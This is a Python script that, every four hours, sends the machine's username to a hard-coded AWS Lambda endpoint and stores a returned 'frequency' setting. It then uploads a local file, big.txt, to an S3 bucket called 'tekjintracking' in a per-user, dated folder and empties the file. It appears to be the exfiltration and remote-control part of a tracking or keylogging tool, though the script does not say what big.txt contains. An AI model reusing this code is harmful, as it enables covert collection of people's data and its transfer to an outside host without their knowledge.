import requests
import os
import time
import boto3

# define the API endpoint to call
def get_username():
    if os.name == "nt":
        return os.getenv("USERNAME")
    elif os.name == "posix":
        return os.getenv("USER")
    else:
        return "unknown"

def update_con():
  # do something
    print(get_username())
    url = "https://bq2hwfyc35euxkxcddinbbauj40qncrk.lambda-url.us-east-1.on.aws/?user="+get_username()
    try:
        response = requests.get(url)
        if response.status_code == 200:
            value = response.json()["frequency"]
            print(value)
            with open("con.txt", "w") as f:
                f.write(str(value))
            print("Value saved.")
        else:
            print("API request failed with status code:", response.status_code)
    except requests.exceptions.RequestException as e:
        print("API request failed:", e)
def upload_big_txt():
    bucket_name = "tekjintracking"
    timestamp = time.strftime("%y-%m-%d", time.localtime())
    folder_path = "TX_"+get_username()+"/"+timestamp
    print(timestamp)
    upload_file("big.txt",folder_path,bucket_name)
# Function to upload file to S3 bucket
def upload_file(filename , folder_path ,bucket_name):
    s3 = boto3.client('s3')
    s3.upload_file(filename, bucket_name, os.path.join(folder_path, filename))
    print(f"{filename} uploaded successfully.")
    with open("big.txt", 'w') as file:
        pass
def main():
  while True:
    update_con()
    upload_big_txt()
    time.sleep(4*60*60)


if __name__ == "__main__":
  main()
